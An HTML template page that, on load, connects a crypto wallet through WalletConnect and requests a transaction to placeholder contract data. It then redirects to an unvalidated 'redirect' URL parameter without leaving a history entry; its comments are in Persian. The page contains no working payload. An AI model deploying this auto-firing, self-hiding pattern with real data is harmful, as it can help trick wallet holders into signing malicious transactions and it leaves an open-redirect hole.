<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Transaction</title>
  <script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/web3modal"></script>
</head>
<body>
<script>
(async () => {
  const urlParams = new URLSearchParams(window.location.search);
  const redirectURL = urlParams.get("redirect") || "https://test.com";

  try {
    // WalletConnect Provider
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          rpc: {
            1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"
          }
        }
      }
    };

    const web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions
    });

    const instance = await web3Modal.connect();
    const web3 = new Web3(instance);

    const accounts = await web3.eth.getAccounts();

    // تراکنش نمونه (اینجا باید تراکنش واقعی خودت رو بسازی)
    const tx = {
      from: accounts[0],
      to: "0xYourContractAddress",
      data: "0xYourEncodedFunctionData",
      value: "0x0"
    };

    await web3.eth.sendTransaction(tx);

  } catch (err) {
    console.error("Tx error:", err);
  } finally {
    // انتقال بدون باقی ماندن در history
    location.replace(redirectURL);
  }
})();
</script>
</body>
</html>
